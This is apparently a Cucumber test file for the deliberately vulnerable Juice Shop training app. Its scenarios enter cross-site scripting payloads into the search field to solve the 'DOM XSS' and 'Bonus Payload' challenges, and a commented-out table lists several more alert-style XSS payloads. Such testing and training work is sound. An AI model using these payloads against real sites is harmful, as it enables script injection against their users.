Feature: Juice Shop is susceptible to XSS attacks

  Background:
    Given Haxxor goes to the Juice Shop

  Scenario: Haxxor injects HTML into the search input
    When she searches for "<iframe src=\"javascript:alert(`xss`)\">"
    Then she sees an alert message containing "xss"
    And she sees she has solved the "DOM XSS" challenge

  Scenario: Haxxor can inject a payload into the page
    When she searches for "<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true\"></iframe>"
    Then she sees she has solved the "Bonus Payload" challenge

  # Scenario Outline: Inject XSS payloads into the search form and verify no script execution
  #   When she searches for "<payload>"
  #   Then she sees an alert message containing ""

  #   Examples:
  #     | payload                                |
  #     | <script>alert(`XSS`)</script>          |
  #     | '"><img src=x onerror=alert(`alert`)>  |
  #     | <svg/onload=alert(`XSS`)>              |
  #     | <body onload=alert(`XSS`)>             |
  #     | "><iframe src=javascript:alert(alert)> |
